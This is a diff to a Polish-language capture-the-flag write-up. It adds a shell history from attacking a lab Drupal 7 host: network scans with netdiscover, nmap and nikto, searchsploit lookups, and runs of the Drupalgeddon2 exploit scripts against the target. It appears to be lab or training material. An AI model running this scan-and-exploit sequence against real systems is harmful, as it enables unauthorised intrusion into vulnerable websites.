@@ -30,3 +30,15 @@ Komendy wpisane już wewnątrz przejętego systemu.
 ls – Wylistowanie plików w katalogu.
 
 cat flag1.txt – Odczytanie zawartości pierwszej flagi.
+
+## Wynik komendy history:
+
+  501  sudo netdiscover -r 192.168.64.0/24
+  502  nmap -sV 192.168.64.10
+  503  nikto -h 192.168.64.10
+  504  searchsploit drupal 7
+  505  searchsploit -m 44449
+  506  python3 drupalgeddon2.py 192.168.64.10
+  507  ruby 44449.rb 192.168.64.10
+  508  sudo gem install highline -v 2.1.0
+  509  ruby 44449.rb 192.168.64.10
